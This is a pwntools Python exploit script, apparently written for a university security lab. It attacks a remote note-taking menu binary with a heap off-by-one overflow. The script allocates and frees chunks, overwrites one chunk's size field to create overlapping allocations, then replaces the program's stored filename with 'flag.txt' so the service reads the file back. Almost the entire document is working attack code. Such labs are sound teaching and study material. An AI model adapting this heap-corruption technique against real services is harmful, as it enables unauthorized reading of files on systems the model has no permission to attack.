from pwn import *

# Launch exploit process
#p = gdb.debug("./lab9-2.bin")            # run exploit against binary locally with process attached to gdb
#p = process("./lab9-2.bin")              # run exploit against binary locally without attacking the process to gdb
p = remote("csc748.hostbin.org", 7092)   # run the exploit against a remote process

notes = "AB"

# Allocate 2 equal chunks of 24 bytes from the top chunk
for note in notes:
	menu = p.recvuntil("What would you like to do?: ")
	print(menu.decode("utf-8"))
	menu = p.recvuntil("(1) New, (2) Delete, (3) Setup filename, (4) Read file\n")
	print(menu.decode("utf-8"))
	menu = p.recvuntil("Choice: ")
	print(menu.decode("utf-8"))
	# Send menu selection "New"
	p.sendline(b'1')
	# Get Size
	size = p.recvuntil("Size: ")
	print(size.decode("utf-8"))
	p.sendline(b'24')
	# Get contents
	contents = p.recvuntil("Contents: ")
	print(contents.decode("utf-8"))
	p.sendline(note * 24)
	# Get message
	message = p.recvline()
	print(message.decode("utf-8"))
	print("\n")

# Setup the default file name establishing the 3rd contiguous chunk
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) Delete, (3) Setup filename, (4) Read file\n")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "Setup Filename"
p.sendline(b'3')
# Get message
message = p.recvline()
print(message.decode("utf-8"))
print("\n")

# Free chunk ID#0																																																																																																																
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) Delete, (3) Setup filename, (4) Read file")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")																																																						
print(menu.decode("utf-8"))
# Send menu selection "Delete"
p.sendline(b'2')
# Get message
message = p.recvuntil("Note ID?: ")
print(message.decode("utf-8"))
p.sendline(b'0')
print("\n")

# Allocate 1 chunks of 24 bytes, overflow by 1 btes
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) Delete, (3) Setup filename, (4) Read file")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "New"
p.sendline(b'1')
# Get Size
size = p.recvuntil("Size: ")
print(size.decode("utf-8"))
p.sendline(b'24')
# Get contents
contents = p.recvuntil("Contents: ")
print(contents.decode("utf-8"))
p.sendline(b'A' * 25)
# Get message
message = p.recvline()
print(message.decode("utf-8"))
print("\n")

# Free chunk ID#1																																																																																																																
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) Delete, (3) Setup filename, (4) Read file")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")																																																						
print(menu.decode("utf-8"))
# Send menu selection "Delete"
p.sendline(b'2')
# Get message
message = p.recvuntil("Note ID?: ")
print(message.decode("utf-8"))
p.sendline(b'1')
print("\n")

# Allocte and change of the size of the overlap and change default filename
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) Delete, (3) Setup filename, (4) Read file")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "New"
p.sendline(b'1')
# Get Size
size = p.recvuntil("Size: ")
print(size.decode("utf-8"))
p.sendline(b'56')
# Get contents
contents = p.recvuntil("Contents: ")
print(contents.decode("utf-8"))

#*********swap code commenting for the next two line for local binary testing vs remote code exploitation***********

#p.sendline((b'A' * 32) + (b'/home/xubuntu/flag.txt')) # Local binary test code, requires "flag.txt" presence in "/home/xubuntu/" directory
p.sendline((b'A' * 32) + (b'flag.txt')) # Remote exploit code, requires "flag.txt" presence in "/" directory
# Get message
message = p.recvline()
print(message.decode("utf-8"))
print("\n")

# Read the file 
menu = p.recvuntil("What would you like to do?: ")
print(menu.decode("utf-8"))
menu = p.recvuntil("(1) New, (2) Delete, (3) Setup filename, (4) Read file")
print(menu.decode("utf-8"))
menu = p.recvuntil("Choice: ")
print(menu.decode("utf-8"))
# Send menu selection "Edit"
p.sendline(b'4')
# Get message
message = p.recvuntil("}")
print(message.decode("utf-8"))
print("\n")

# Present menu prompt 
menu = p.recv()
print(menu.decode("utf-8"))

